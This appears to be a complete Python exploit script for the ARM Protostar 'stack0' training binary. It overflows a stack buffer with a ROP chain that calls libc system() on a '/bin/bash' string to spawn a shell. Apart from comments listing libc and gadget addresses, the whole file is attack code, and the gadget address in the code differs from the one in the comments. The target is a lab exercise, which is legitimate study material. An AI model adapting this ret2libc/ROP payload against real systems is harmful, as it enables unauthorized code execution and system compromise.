#!/usr/local/bin/python

import subprocess
from struct import * 

# libc
# 0xb6ebc000

# 0x000ce774 : pop {r0, r1, r2, r3, fp, lr} ; bx lr
# b6f8a774

# system()
# 0xb6ed2cb8

# 0xbefff90e:	 "SHELL=/bin/bash"
# 0xbefff914
# 0xbeffff5c

buf = 'A' * 72
buf += pack('<I', 0xb6f66774)
buf += pack('<I', 0xbeffff5c)
buf += 'BBBB'
buf += 'CCCC'
buf += 'DDDD'
buf += 'EEEE'
buf += pack('<I', 0xb6ed2cb8)

# Do it! 
p = subprocess.Popen(['/home/pi/exploit-exercises-arm/protostar/stack0/stack0'], stdin=subprocess.PIPE, shell=True)
p.stdin.write(buf)
